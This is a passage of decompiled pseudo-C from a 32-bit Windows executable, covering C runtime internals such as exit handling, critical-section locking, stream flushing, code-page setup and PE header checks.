      return (HMODULE)((int (__stdcall *)(int))result)(a1);
  }
  return result;
}

//----- (004141FB) --------------------------------------------------------
void __cdecl __noreturn sub_4141FB(UINT uExitCode)
{
  sub_4141D0(uExitCode);
  ExitProcess(uExitCode);
}

//----- (00414213) --------------------------------------------------------
void __cdecl sub_414213(UINT uExitCode, int a2, int a3)
{
  PVOID *v3; // ebx
  PVOID *v4; // edi
  void (*v5)(void); // ebx
  PVOID *v6; // ebx
  PVOID *v7; // eax
  PVOID *v8; // [esp+10h] [ebp-30h]
  PVOID *v9; // [esp+18h] [ebp-28h]
  PVOID *v10; // [esp+1Ch] [ebp-24h]
  void (**j)(void); // [esp+20h] [ebp-20h]
  void (**i)(void); // [esp+24h] [ebp-1Ch]

  sub_4144A0(8);
  if ( dword_4252FC != 1 )
  {
    dword_4252F8 = 1;
    byte_4252F4 = a3;
    if ( !a2 )
    {
      v3 = (PVOID *)DecodePointer(dword_429F04);
      v8 = v3;
      if ( v3 )
      {
        v4 = (PVOID *)DecodePointer(dword_429F00);
        v10 = v3;
        v9 = v4;
        while ( --v4 >= v3 )
        {
          if ( *v4 != sub_41404C() )
          {
            if ( v4 < v3 )
              break;
            v5 = (void (*)(void))DecodePointer(*v4);
            *v4 = sub_41404C();
            v5();
            v6 = (PVOID *)DecodePointer(dword_429F04);
            v7 = (PVOID *)DecodePointer(dword_429F00);
            if ( v10 != v6 || v9 != v7 )
            {
              v10 = v6;
              v8 = v6;
              v9 = v7;
              v4 = v7;
            }
            v3 = v8;
          }
        }
      }
      for ( i = (void (**)(void))&unk_4192C4; i < &dword_4192D0; ++i )
      {
        if ( *i )
          (*i)();
      }
    }
    for ( j = (void (**)(void))&unk_4192D4; j < dword_4192D8; ++j )
    {
      if ( *j )
        (*j)();
    }
  }
  if ( a3 )
    sub_4143C7(8);
  if ( !a3 )
  {
    dword_4252FC = 1;
    sub_4143C7(8);
    sub_4141FB(uExitCode);
  }
}
// 4144A0: using guessed type _DWORD __cdecl sub_4144A0(_DWORD);
// 4192D0: using guessed type void (*dword_4192D0)(void);
// 4192D8: using guessed type void (*dword_4192D8[9])(void);
// 4252F4: using guessed type char byte_4252F4;
// 4252F8: using guessed type int dword_4252F8;
// 4252FC: using guessed type int dword_4252FC;

//----- (00414353) --------------------------------------------------------
void __cdecl sub_414353(UINT uExitCode)
{
  sub_414213(uExitCode, 1, 0);
}

//----- (00414369) --------------------------------------------------------
void __usercall __noreturn sub_414369(int a1@<edi>, int a2)
{
  sub_4160FF(a1);
  sub_415F50(a2);
  sub_414353(0xFFu);
  __debugbreak();
}

//----- (00414387) --------------------------------------------------------
LPVOID __cdecl sub_414387(unsigned int a1, unsigned int a2)
{
  LPVOID v2; // esi
  DWORD v4; // [esp+4h] [ebp-4h] BYREF

  v4 = 0;
  v2 = sub_4157D1(a1, a2, &v4);
  if ( !v2 && v4 && sub_413A1F() )
    *sub_413A1F() = v4;
  return v2;
}

//----- (004143C7) --------------------------------------------------------
void __cdecl sub_4143C7(int a1)
{
  LeaveCriticalSection(lpCriticalSection[2 * a1]);
}
// 423480: using guessed type LPCRITICAL_SECTION lpCriticalSection[88];

//----- (004143DE) --------------------------------------------------------
int __cdecl sub_4143DE(int a1)
{
  LPCRITICAL_SECTION *v1; // esi
  struct _RTL_CRITICAL_SECTION *v3; // edi
  int v4; // [esp-4h] [ebp-30h]
  int v5; // [esp-4h] [ebp-30h]
  int v6; // [esp+10h] [ebp-1Ch]

  v6 = 1;
  if ( !hHeap )
  {
    sub_4160FF(1);
    sub_415F50(30);
    sub_4141FB(0xFFu);
  }
  v1 = &lpCriticalSection[2 * a1];
  if ( *v1 )
    return 1;
  v3 = (struct _RTL_CRITICAL_SECTION *)sub_413FBB((void *)1, 0x18u);
  if ( v3 )
  {
    sub_4144A0(10);
    if ( *v1 )
    {
      sub_4139A3(v3);
    }
    else if ( InitializeCriticalSectionAndSpinCount(v3, 0xFA0u) )
    {
      *v1 = v3;
    }
    else
    {
      sub_4139A3(v3);
      *(_DWORD *)sub_413A1F(v5) = 12;
      v6 = 0;
    }
    sub_4143C7(10);
    return v6;
  }
  else
  {
    *(_DWORD *)sub_413A1F(v4) = 12;
    return 0;
  }
}
// 414432: variable 'v4' is possibly undefined
// 414467: variable 'v5' is possibly undefined
// 413A1F: using guessed type int __fastcall sub_413A1F(_DWORD);
// 4144A0: using guessed type _DWORD __cdecl sub_4144A0(_DWORD);
// 423480: using guessed type LPCRITICAL_SECTION lpCriticalSection[88];

//----- (004144A0) --------------------------------------------------------
void __usercall sub_4144A0(int a1@<edi>, int a2)
{
  LPCRITICAL_SECTION *v2; // esi

  v2 = &lpCriticalSection[2 * a2];
  if ( !*v2 && !sub_4143DE(a2) )
    sub_414369(a1, 17);
  EnterCriticalSection(*v2);
}
// 423480: using guessed type LPCRITICAL_SECTION lpCriticalSection[88];

//----- (004144D3) --------------------------------------------------------
int __usercall sub_4144D3@<eax>(int a1@<edi>)
{
  int i; // edi
  unsigned int v2; // eax
  int v4; // [esp+14h] [ebp-1Ch]

  v4 = 0;
  sub_4144A0(a1, 1);
  for ( i = 3; i < dword_42AF20; ++i )
  {
    if ( *((_DWORD *)lpMem + i) )
    {
      v2 = *((_DWORD *)lpMem + i);
      if ( (*(_BYTE *)(v2 + 12) & 0x83) != 0 && sub_4161A5(i, v2) != -1 )
        ++v4;
      if ( i >= 20 )
      {
        DeleteCriticalSection((LPCRITICAL_SECTION)(*((_DWORD *)lpMem + i) + 32));
        sub_4139A3(*((LPVOID *)lpMem + i));
        *((_DWORD *)lpMem + i) = 0;
      }
    }
  }
  sub_4143C7(1);
  return v4;
}
// 42AF20: using guessed type int dword_42AF20;

//----- (0041456F) --------------------------------------------------------
int __cdecl sub_41456F(_DWORD *a1)
{
  int v1; // eax
  int v2; // ebx
  int v3; // eax
  int *v4; // edi
  int v5; // eax
  int v6; // eax
  int v7; // eax
  const void *v9; // [esp-Ch] [ebp-14h]
  DWORD v10; // [esp-8h] [ebp-10h]

  v1 = a1[3];
  v2 = 0;
  if ( (v1 & 3) == 2 && (v1 & 0x108) != 0 )
  {
    v3 = a1[2];
    v4 = (int *)(*a1 - v3);
    if ( (int)v4 > 0 )
    {
      v10 = *a1 - v3;
      v9 = (const void *)a1[2];
      v5 = sub_414758((int)v4, (int)a1);
      if ( (int *)sub_416916(v4, v5, v9, v10) == v4 )
      {
        v6 = a1[3];
        if ( (v6 & 0x80u) != 0 )
          a1[3] = v6 & 0xFFFFFFFD;
      }
      else
      {
        a1[3] |= 0x20u;
        v2 = -1;
      }
    }
  }
  v7 = a1[2];
  a1[1] = 0;
  *a1 = v7;
  return v2;
}

//----- (004145D7) --------------------------------------------------------
int __usercall sub_4145D7@<eax>(int *a1@<edi>, _DWORD *a2)
{
  int v3; // eax

  if ( !a2 )
    return sub_41461F(0);
  if ( sub_41456F(a2) )
    return -1;
  if ( (a2[3] & 0x4000) == 0 )
    return 0;
  v3 = sub_414758((int)a1, (int)a2);
  return -(sub_4169EA(a1, v3) != 0);
}
// 41461F: using guessed type _DWORD __cdecl sub_41461F(_DWORD);

//----- (0041461F) --------------------------------------------------------
int __cdecl sub_41461F(int a1)
{
  int i; // esi
  int *v2; // eax
  int v3; // eax
  int v4; // ecx
  int result; // eax
  int v6; // [esp+10h] [ebp-24h]
  int v7; // [esp+18h] [ebp-1Ch]

  v7 = 0;
  v6 = 0;
  sub_4144A0(0, 1);
  for ( i = 0; i < dword_42AF20; ++i )
  {
    v2 = (int *)((char *)lpMem + 4 * i);
    if ( *v2 )
    {
      v3 = *v2;
      if ( (*(_BYTE *)(v3 + 12) & 0x83) != 0 )
      {
        sub_413B7A(0, i, v3);
        v4 = *(_DWORD *)(*((_DWORD *)lpMem + i) + 12);
        if ( (v4 & 0x83) != 0 )
        {
          if ( a1 == 1 )
          {
            if ( sub_4145D7(0, *((_DWORD **)lpMem + i)) != -1 )
              ++v7;
          }
          else if ( !a1 && (v4 & 2) != 0 && sub_4145D7(0, *((_DWORD **)lpMem + i)) == -1 )
          {
            v6 = -1;
          }
        }
        sub_413BE8(i, *((_DWORD *)lpMem + i));
      }
    }
  }
  sub_4143C7(1);
  result = v7;
  if ( a1 != 1 )
    return v6;
  return result;
}
// 42AF20: using guessed type int dword_42AF20;

//----- (004146F9) --------------------------------------------------------
int sub_4146F9()
{
  return sub_41461F(1);
}

//----- (00414702) --------------------------------------------------------
int __usercall sub_414702@<eax>(int a1@<edi>, int a2)
{
  if ( a2 == -2 )
  {
    *sub_413A1F() = 9;
    return 0;
  }
  if ( a2 < 0 || a2 >= (unsigned int)dword_429DF8 )
  {
    *sub_413A1F() = 9;
    sub_413993(a1);
    return 0;
  }
  return *(_BYTE *)(dword_429E00[a2 >> 5] + ((a2 & 0x1F) << 6) + 4) & 0x40;
}
// 429DF8: using guessed type int dword_429DF8;
// 429E00: using guessed type int dword_429E00[];

//----- (00414758) --------------------------------------------------------
int __usercall sub_414758@<eax>(int a1@<edi>, int a2)
{
  if ( a2 )
    return *(_DWORD *)(a2 + 16);
  *sub_413A1F() = 22;
  sub_413993(a1);
  return -1;
}

//----- (0041477E) --------------------------------------------------------
int __usercall sub_41477E@<eax>(int a1@<eax>)
{
  int v1; // eax
  int v2; // eax
  int v3; // eax

  v1 = a1 - 932;
  if ( !v1 )
    return 1041;
  v2 = v1 - 4;
  if ( !v2 )
    return 2052;
  v3 = v2 - 13;
  if ( !v3 )
    return 1042;
  if ( v3 == 1 )
    return 1028;
  return 0;
}

//----- (004147AD) --------------------------------------------------------
_BYTE *__usercall sub_4147AD@<eax>(_DWORD *a1@<eax>)
{
  _BYTE *v2; // eax
  int v3; // ecx
  int v4; // edi
  _BYTE *result; // eax
  int v6; // esi

  sub_413EB0((int)(a1 + 7), 0, 0x101u);
  a1[1] = 0;
  a1[2] = 0;
  a1[3] = 0;
  a1[4] = 0;
  a1[5] = 0;
  a1[6] = 0;
  v2 = a1 + 7;
  v3 = &unk_4235E0 - (_UNKNOWN *)a1;
  v4 = 257;
  do
  {
    *v2 = v2[v3];
    ++v2;
    --v4;
  }
  while ( v4 );
  result = (char *)a1 + 285;
  v6 = 256;
  do
  {
    *result = result[v3];
    ++result;
    --v6;
  }
  while ( v6 );
  return result;
}

//----- (00414811) --------------------------------------------------------
int __usercall sub_414811@<eax>(int a1@<esi>)
{
  unsigned int i; // eax
  BYTE v2; // al
  BYTE *v3; // ebx
  unsigned int v4; // ecx
  unsigned int v5; // eax
  int result; // eax
  WORD v7; // cx
  char v8; // cl
  unsigned int v9; // ecx
  char v10; // dl
  int v11; // [esp+8h] [ebp-51Ch]
  struct _cpinfo CPInfo; // [esp+Ch] [ebp-518h] BYREF
  WORD CharType[256]; // [esp+20h] [ebp-504h] BYREF
  WCHAR v14[128]; // [esp+220h] [ebp-304h] BYREF
  WCHAR DestStr[128]; // [esp+320h] [ebp-204h] BYREF
  CHAR MultiByteStr[256]; // [esp+420h] [ebp-104h] BYREF

  if ( GetCPInfo(*(_DWORD *)(a1 + 4), &CPInfo) )
  {
    for ( i = 0; i < 0x100; ++i )
      MultiByteStr[i] = i;
    v2 = CPInfo.LeadByte[0];
    MultiByteStr[0] = 32;
    if ( CPInfo.LeadByte[0] )
    {
      v3 = &CPInfo.LeadByte[1];
      do
      {
        v4 = v2;
        v5 = *v3;
        if ( v4 <= v5 )
          sub_413EB0((int)&MultiByteStr[v4], 0x20u, v5 - v4 + 1);
        v2 = v3[1];
        v3 += 2;
      }
      while ( v2 );
    }
    sub_416DD7(256, 0, 1u, MultiByteStr, 256, CharType, *(_DWORD *)(a1 + 4), *(_DWORD *)(a1 + 12), 0);
    sub_416CAA(256, 0, *(_DWORD *)(a1 + 12), 0x100u, MultiByteStr, 256, DestStr, 256, *(_DWORD *)(a1 + 4), 0);
    sub_416CAA(256, 0, *(_DWORD *)(a1 + 12), 0x200u, MultiByteStr, 256, v14, 256, *(_DWORD *)(a1 + 4), 0);
    result = 0;
    while ( 1 )
    {
      v7 = CharType[result];
      if ( (v7 & 1) != 0 )
      {
        *(_BYTE *)(a1 + result + 29) |= 0x10u;
        v8 = *((_BYTE *)DestStr + result);
      }
      else
      {
        if ( (v7 & 2) == 0 )
        {
          *(_BYTE *)(a1 + result + 285) = 0;
          goto LABEL_16;
        }
        *(_BYTE *)(a1 + result + 29) |= 0x20u;
        v8 = *((_BYTE *)v14 + result);
      }
      *(_BYTE *)(a1 + result + 285) = v8;
LABEL_16:
      if ( (unsigned int)++result >= 0x100 )
        return result;
    }
  }
  v9 = 0;
  v11 = -97 - (a1 + 285);
  do
  {
    result = a1 + v9 + 285;
    if ( (unsigned int)(result + v11 + 32) <= 0x19 )
    {
      *(_BYTE *)(a1 + v9 + 29) |= 0x10u;
      v10 = v9 + 32;
LABEL_23:
      *(_BYTE *)result = v10;
      goto LABEL_25;
    }
    if ( (unsigned int)(result + v11) <= 0x19 )
    {
      *(_BYTE *)(a1 + v9 + 29) |= 0x20u;
      v10 = v9 - 32;
      goto LABEL_23;
    }
    *(_BYTE *)result = 0;
LABEL_25:
    ++v9;
  }
  while ( v9 < 0x100 );
  return result;
}
// 414811: using guessed type CHAR MultiByteStr[256];
// 414811: using guessed type WORD CharType[256];

//----- (004149A1) --------------------------------------------------------
volatile LONG *__usercall sub_4149A1@<eax>(int a1@<edi>)
{
  DWORD *v1; // edi
  volatile LONG *v2; // esi

  v1 = sub_4141B6(a1);
  if ( (dword_423B00 & v1[28]) != 0 && v1[27] )
  {
    v2 = (volatile LONG *)v1[26];
  }
  else
  {
    sub_4144A0((int)v1, 13);
    v2 = (volatile LONG *)v1[26];
    if ( v2 != lpAddend )
    {
      if ( v2 && !InterlockedDecrement(v2) && v2 != (volatile LONG *)&unk_4235E0 )
        sub_4139A3((LPVOID)v2);
      v1[26] = (DWORD)lpAddend;
      v2 = lpAddend;
      InterlockedIncrement(lpAddend);
    }
    sub_4143C7(13);
  }
  if ( !v2 )
    sub_414369((int)v1, 32);
  return v2;
}
// 423B00: using guessed type int dword_423B00;

//----- (00414A45) --------------------------------------------------------
UINT __usercall sub_414A45@<eax>(int a1@<edi>, int a2@<esi>)
{
  UINT result; // eax
  int v3; // [esp+4h] [ebp-10h] BYREF
  int v4; // [esp+Ch] [ebp-8h]
  char v5; // [esp+10h] [ebp-4h]

  sub_413C17((int)&v3, a1, 0);
  dword_425450 = 0;
  switch ( a2 )
  {
    case -2:
      dword_425450 = 1;
      result = GetOEMCP();
      goto LABEL_3;
    case -3:
      dword_425450 = 1;
      result = GetACP();
      goto LABEL_3;
    case -4:
      result = *(_DWORD *)(v3 + 4);
      dword_425450 = 1;
LABEL_3:
      if ( v5 )
        *(_DWORD *)(v4 + 112) &= ~2u;
      return result;
  }
  if ( v5 )
    *(_DWORD *)(v4 + 112) &= ~2u;
  return a2;
}
// 425450: using guessed type int dword_425450;

//----- (00414AC1) --------------------------------------------------------
int __usercall sub_414AC1@<eax>(int a1@<edi>, int a2, _DWORD *a3)
{
  UINT v3; // edi
  unsigned int i; // eax
  BYTE *v6; // esi
  BYTE v7; // cl
  unsigned int j; // eax
  _BYTE *v9; // esi
  unsigned int v10; // eax
  unsigned int v11; // edi
  _WORD *v12; // eax
  int v13; // ecx
  _WORD *v14; // ecx
  int v15; // edx
  _BYTE *v16; // eax
  int v17; // ecx
  int v18; // edx
  unsigned int v19; // [esp+Ch] [ebp-20h]
  int v20; // [esp+10h] [ebp-1Ch]
  _BYTE *v21; // [esp+10h] [ebp-1Ch]
  struct _cpinfo CPInfo; // [esp+14h] [ebp-18h] BYREF
  UINT v23; // [esp+34h] [ebp+8h]

  v3 = sub_414A45(a1, a2);
  v23 = v3;
  if ( v3 )
  {
    v20 = 0;
    for ( i = 0; i < 60; i += 12 )
    {
      if ( dword_423A10[i] == v3 )
      {
        sub_413EB0((int)(a3 + 7), 0, 0x101u);
        v19 = 0;
        v9 = (char *)&unk_423A20 + 48 * v20;
        v21 = v9;
        do
        {
          while ( *v9 )
          {
            LOBYTE(v10) = v9[1];
            if ( !(_BYTE)v10 )
              break;
            v11 = (unsigned __int8)*v9;
            v10 = (unsigned __int8)v10;
            while ( v11 <= v10 )
            {
              *((_BYTE *)a3 + v11 + 29) |= byte_423A0C[v19];
              v10 = (unsigned __int8)v9[1];
              ++v11;
            }
            v3 = v23;
            v9 += 2;
          }
          ++v19;
          v9 = v21 + 8;
          v21 += 8;
        }
        while ( v19 < 4 );
        a3[1] = v3;
        a3[2] = 1;
        a3[3] = sub_41477E(v3);
        v12 = a3 + 4;
        v14 = (_WORD *)((char *)&unk_423A14 + v13);
        v15 = 6;
        do
        {
          *v12++ = *v14++;
          --v15;
        }
        while ( v15 );
LABEL_26:
        sub_414811((int)a3);
        return 0;
      }
      ++v20;
    }
    if ( v3 == 65000 || v3 == 65001 || !IsValidCodePage((unsigned __int16)v3) )
      return -1;
    if ( GetCPInfo(v3, &CPInfo) )
    {
      sub_413EB0((int)(a3 + 7), 0, 0x101u);
      a3[1] = v3;
      a3[3] = 0;
      if ( CPInfo.MaxCharSize <= 1 )
      {
        a3[2] = 0;
      }
      else
      {
        if ( CPInfo.LeadByte[0] )
        {
          v6 = &CPInfo.LeadByte[1];
          do
          {
            v7 = *v6;
            if ( !*v6 )
              break;
            for ( j = *(v6 - 1); j <= v7; ++j )
              *((_BYTE *)a3 + j + 29) |= 4u;
            v6 += 2;
          }
          while ( *(v6 - 1) );
        }
        v16 = (char *)a3 + 30;
        v17 = 254;
        do
        {
          *v16++ |= 8u;
          --v17;
        }
        while ( v17 );
        a3[3] = sub_41477E(a3[1]);
        a3[2] = v18;
      }
      a3[4] = 0;
      a3[5] = 0;
      a3[6] = 0;
      goto LABEL_26;
    }
    if ( !dword_425450 )
      return -1;
  }
  sub_4147AD(a3);
  return 0;
}
// 414C1D: variable 'v13' is possibly undefined
// 414C70: variable 'v18' is possibly undefined
// 423A10: using guessed type int dword_423A10[];
// 425450: using guessed type int dword_425450;

//----- (00414CAA) --------------------------------------------------------
int __usercall sub_414CAA@<eax>(int a1@<edi>, int a2)
{
  DWORD *v2; // edi
  DWORD v3; // ebx
  _DWORD *v4; // eax
  _DWORD *v5; // ebx
  int v6; // eax
  int i; // eax
  int j; // eax
  int k; // eax
  int v11; // [esp+14h] [ebp-20h]
  int v12; // [esp+3Ch] [ebp+8h]

  v11 = -1;
  v2 = sub_4141B6(a1);
  sub_4149A1((int)v2);
  v3 = v2[26];
  v12 = sub_414A45((int)v2, a2);
  if ( v12 == *(_DWORD *)(v3 + 4) )
    return 0;
  v4 = sub_413FBB(v2, 0x220u);
  v5 = v4;
  if ( v4 )
  {
    qmemcpy(v4, (const void *)v2[26], 0x220u);
    *v4 = 0;
    v6 = sub_414AC1((int)(v4 + 136), v12, v4);
    v11 = v6;
    if ( v6 )
    {
      if ( v6 == -1 )
      {
        if ( v5 != (_DWORD *)&unk_4235E0 )
          sub_4139A3(v5);
        *sub_413A1F() = 22;
      }
    }
    else
    {
      if ( !InterlockedDecrement((volatile LONG *)v2[26]) && (_UNKNOWN *)v2[26] != &unk_4235E0 )
        sub_4139A3((LPVOID)v2[26]);
      v2[26] = (DWORD)v5;
      InterlockedIncrement(v5);
      if ( (v2[28] & 2) == 0 && (dword_423B00 & 1) == 0 )
      {
        sub_4144A0((int)InterlockedIncrement, 13);
        dword_425460 = v5[1];
        dword_425464 = v5[2];
        dword_425468 = v5[3];
        for ( i = 0; i < 5; ++i )
          word_425454[i] = *((_WORD *)v5 + i + 8);
        for ( j = 0; j < 257; ++j )
          byte_423800[j] = *((_BYTE *)v5 + j + 28);
        for ( k = 0; k < 256; ++k )
          byte_423908[k] = *((_BYTE *)v5 + k + 285);
        if ( !InterlockedDecrement(lpAddend) && lpAddend != (volatile LONG *)&unk_4235E0 )
          sub_4139A3((LPVOID)lpAddend);
        lpAddend = v5;
        InterlockedIncrement(v5);
        sub_4143C7(13);
      }
    }
  }
  return v11;
}
// 423B00: using guessed type int dword_423B00;
// 425454: using guessed type __int16 word_425454[];
// 425460: using guessed type int dword_425460;
// 425464: using guessed type int dword_425464;
// 425468: using guessed type int dword_425468;

//----- (00414E44) --------------------------------------------------------
int __usercall sub_414E44@<eax>(int a1@<edi>)
{
  if ( !dword_429F08 )
  {
    sub_414CAA(a1, -3);
    dword_429F08 = 1;
  }
  return 0;
}
// 429F08: using guessed type int dword_429F08;

//----- (00414E62) --------------------------------------------------------
LONG __cdecl sub_414E62(volatile LONG *lpAddend)
{
  volatile LONG **v2; // ebx
  int lpAddenda; // [esp+14h] [ebp+8h]

  InterlockedIncrement(lpAddend);
  if ( *((_DWORD *)lpAddend + 44) )
    InterlockedIncrement(*((volatile LONG **)lpAddend + 44));
  if ( *((_DWORD *)lpAddend + 46) )
    InterlockedIncrement(*((volatile LONG **)lpAddend + 46));
  if ( *((_DWORD *)lpAddend + 45) )
    InterlockedIncrement(*((volatile LONG **)lpAddend + 45));
  if ( *((_DWORD *)lpAddend + 48) )
    InterlockedIncrement(*((volatile LONG **)lpAddend + 48));
  v2 = (volatile LONG **)(lpAddend + 20);
  lpAddenda = 6;
  do
  {
    if ( *(v2 - 2) != (volatile LONG *)&unk_423B04 && *v2 )
      InterlockedIncrement(*v2);
    if ( *(v2 - 1) && v2[1] )
      InterlockedIncrement(v2[1]);
    v2 += 4;
    --lpAddenda;
  }
  while ( lpAddenda );
  return InterlockedIncrement((volatile LONG *)(*((_DWORD *)lpAddend + 53) + 180));
}

//----- (00414EF1) --------------------------------------------------------
volatile LONG *__cdecl sub_414EF1(volatile LONG *lpAddend)
{
  volatile LONG **v2; // ebx
  int lpAddenda; // [esp+Ch] [ebp+8h]

  if ( lpAddend )
  {
    InterlockedDecrement(lpAddend);
    if ( *((_DWORD *)lpAddend + 44) )
      InterlockedDecrement(*((volatile LONG **)lpAddend + 44));
    if ( *((_DWORD *)lpAddend + 46) )
      InterlockedDecrement(*((volatile LONG **)lpAddend + 46));
    if ( *((_DWORD *)lpAddend + 45) )
      InterlockedDecrement(*((volatile LONG **)lpAddend + 45));
    if ( *((_DWORD *)lpAddend + 48) )
      InterlockedDecrement(*((volatile LONG **)lpAddend + 48));
    v2 = (volatile LONG **)(lpAddend + 20);
    lpAddenda = 6;
    do
    {
      if ( *(v2 - 2) != (volatile LONG *)&unk_423B04 && *v2 )
        InterlockedDecrement(*v2);
      if ( *(v2 - 1) && v2[1] )
        InterlockedDecrement(v2[1]);
      v2 += 4;
      --lpAddenda;
    }
    while ( lpAddenda );
    InterlockedDecrement((volatile LONG *)(*((_DWORD *)lpAddend + 53) + 180));
  }
  return lpAddend;
}

//----- (00414F8A) --------------------------------------------------------
void __cdecl sub_414F8A(char *lpMem)
{
  void **v2; // eax
  _DWORD *v3; // eax
  _DWORD *v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax
  int v7; // eax
  LPVOID *v8; // edi
  _DWORD *v9; // eax
  int lpMema; // [esp+14h] [ebp+8h]

  v2 = (void **)*((_DWORD *)lpMem + 47);
  if ( v2 )
  {
    if ( v2 != &off_423D90 )
    {
      v3 = (_DWORD *)*((_DWORD *)lpMem + 44);
      if ( v3 )
      {
        if ( !*v3 )
        {
          v4 = (_DWORD *)*((_DWORD *)lpMem + 46);
          if ( v4 && !*v4 )
          {
            sub_4139A3(*((LPVOID *)lpMem + 46));
            sub_4171F7(*((_DWORD *)lpMem + 47));
          }
          v5 = (_DWORD *)*((_DWORD *)lpMem + 45);
          if ( v5 && !*v5 )
          {
            sub_4139A3(*((LPVOID *)lpMem + 45));
            sub_41718E(*((_DWORD *)lpMem + 47));
          }
          sub_4139A3(*((LPVOID *)lpMem + 44));
          sub_4139A3(*((LPVOID *)lpMem + 47));
        }
      }
    }
  }
  v6 = (_DWORD *)*((_DWORD *)lpMem + 48);
  if ( v6 && !*v6 )
  {
    sub_4139A3((LPVOID)(*((_DWORD *)lpMem + 49) - 254));
    sub_4139A3((LPVOID)(*((_DWORD *)lpMem + 51) - 128));
    sub_4139A3((LPVOID)(*((_DWORD *)lpMem + 52) - 128));
    sub_4139A3(*((LPVOID *)lpMem + 48));
  }
  v7 = *((_DWORD *)lpMem + 53);
  if ( (char **)v7 != off_423B08 && !*(_DWORD *)(v7 + 180) )
  {
    sub_416E17(*((LPVOID **)lpMem + 53));
    sub_4139A3(*((LPVOID *)lpMem + 53));
  }
  v8 = (LPVOID *)(lpMem + 80);
  lpMema = 6;
  do
  {
    if ( *(v8 - 2) != &unk_423B04 && *v8 && !*(_DWORD *)*v8 )
      sub_4139A3(*v8);
    if ( *(v8 - 1) )
    {
      v9 = v8[1];
      if ( v9 )
      {
        if ( !*v9 )
          sub_4139A3(v8[1]);
      }
    }
    v8 += 4;
    --lpMema;
  }
  while ( lpMema );
  sub_4139A3(lpMem);
}
// 423B08: using guessed type char *off_423B08[43];
// 423D90: using guessed type void *off_423D90;

//----- (004150D5) --------------------------------------------------------
volatile LONG *__cdecl sub_4150D5(volatile LONG **a1, volatile LONG *lpAddend)
{
  volatile LONG *v2; // esi

  if ( !lpAddend || !a1 )
    return 0;
  v2 = *a1;
  if ( *a1 != lpAddend )
  {
    *a1 = lpAddend;
    sub_414E62(lpAddend);
    if ( v2 )
    {
      sub_414EF1(v2);
      if ( !*v2 && v2 != (volatile LONG *)&unk_423C70 )
        sub_414F8A((char *)v2);
    }
  }
  return lpAddend;
}

//----- (00415122) --------------------------------------------------------
DWORD __usercall sub_415122@<eax>(int a1@<edi>)
{
  DWORD *v1; // esi
  DWORD v2; // esi
  volatile LONG *v4; // [esp+10h] [ebp-1Ch]

  v1 = sub_4141B6(a1);
  if ( (dword_423B00 & v1[28]) != 0 && v1[27] )
  {
    v2 = sub_4141B6(a1)[27];
  }
  else
  {
    sub_4144A0(a1, 12);
    v4 = sub_4150D5((volatile LONG **)v1 + 27, off_423D48);
    sub_4143C7(12);
    v2 = (DWORD)v4;
  }
  if ( !v2 )
    sub_414369(a1, 32);
  return v2;
}
// 423B00: using guessed type int dword_423B00;

//----- (0041519B) --------------------------------------------------------
int __usercall sub_41519B@<eax>(int a1@<edi>, unsigned __int8 a2, _DWORD *a3)
{
  int result; // eax
  int v4; // [esp+0h] [ebp-10h] BYREF
  int v5; // [esp+8h] [ebp-8h]
  char v6; // [esp+Ch] [ebp-4h]

  sub_413C17((int)&v4, a1, a3);
  result = *(_WORD *)(*(_DWORD *)(v4 + 200) + 2 * a2) & 0x8000;
  if ( v6 )
    *(_DWORD *)(v5 + 112) &= ~2u;
  return result;
}

//----- (004151D3) --------------------------------------------------------
int __usercall sub_4151D3@<eax>(int a1@<edi>, unsigned __int8 a2)
{
  return sub_41519B(a1, a2, 0);
}

//----- (00415290) --------------------------------------------------------
int __usercall sub_415290@<eax>(int a1@<ebp>, _DWORD *a2, int a3, unsigned int a4)
{
  int result; // eax
  unsigned int v5; // esi
  int v6; // esi
  int v7; // ebx
  _DWORD v8[10]; // [esp-8h] [ebp-28h] BYREF

  v8[5] = a2;
  v8[4] = a3;
  v8[3] = a4;
  v8[1] = &loc_415320;
  v8[0] = NtCurrentTeb()->NtTib.ExceptionList;
  v8[2] = (unsigned int)v8 ^ dword_423460;
  while ( 1 )
  {
    result = a3;
    v5 = *(_DWORD *)(a3 + 12);
    if ( v5 == -2 || a4 != -2 && v5 <= a4 )
      break;
    v6 = 3 * v5;
    v7 = (*a2 ^ *(_DWORD *)(a3 + 8)) + 4 * v6 + 16;
    *(_DWORD *)(a3 + 12) = *(_DWORD *)((*a2 ^ *(_DWORD *)(a3 + 8)) + 4 * v6 + 0x10);
    if ( !*(_DWORD *)(v7 + 4) )
    {
      sub_4174A5(*(_DWORD *)(v7 + 8), a1, 257);
      sub_4174C4(*(int (**)(void))(v7 + 8));
    }
  }
  return result;
}
// 423460: using guessed type int dword_423460;

//----- (00415382) --------------------------------------------------------
int __thiscall sub_415382(int (*this)(void))
{
  return this();
}

//----- (00415399) --------------------------------------------------------
int __fastcall sub_415399(int (__fastcall *a1)(_DWORD, _DWORD), int a2)
{
  sub_4174A5((int)a1, a2, 1);
  return a1(0, 0);
}

//----- (004153B2) --------------------------------------------------------
void __fastcall sub_4153B2(PVOID TargetFrame, PEXCEPTION_RECORD ExceptionRecord)
{
  RtlUnwind(TargetFrame, &loc_4153C6, ExceptionRecord, 0);
}

//----- (004153CB) --------------------------------------------------------
int __fastcall sub_4153CB(int a1, unsigned int a2, int a3, _DWORD *a4)
{
  return sub_415290(a3, a4, a1, a2);
}

//----- (004153F0) --------------------------------------------------------
BOOL __cdecl sub_4153F0(int a1)
{
  int v2; // eax

  if ( *(_WORD *)a1 == 23117 && (v2 = a1 + *(_DWORD *)(a1 + 60), *(_DWORD *)v2 == 17744) )
    return *(_WORD *)(v2 + 24) == 267;
  else
    return 0;
}

//----- (00415430) --------------------------------------------------------
int __cdecl sub_415430(int a1, unsigned int a2)
{
  int v2; // ecx
  unsigned int v3; // esi
  unsigned int v4; // edx
  int result; // eax
  unsigned int v6; // ecx

  v2 = a1 + *(_DWORD *)(a1 + 60);
  v3 = *(unsigned __int16 *)(v2 + 6);
  v4 = 0;
  result = *(unsigned __int16 *)(v2 + 20) + v2 + 24;
  if ( !*(_WORD *)(v2 + 6) )
    return 0;
  while ( 1 )
  {
    v6 = *(_DWORD *)(result + 12);
    if ( a2 >= v6 && a2 < v6 + *(_DWORD *)(result + 8) )
      break;
    ++v4;
    result += 40;
    if ( v4 >= v3 )
      return 0;
  }
  return result;
}

//----- (00415480) --------------------------------------------------------
BOOL __cdecl sub_415480(int a1)
{
  int v1; // eax

  return sub_4153F0(0x400000) && (v1 = sub_415430(0x400000, a1 - 0x400000)) != 0 && *(int *)(v1 + 36) >= 0;
}

//----- (0041553C) --------------------------------------------------------
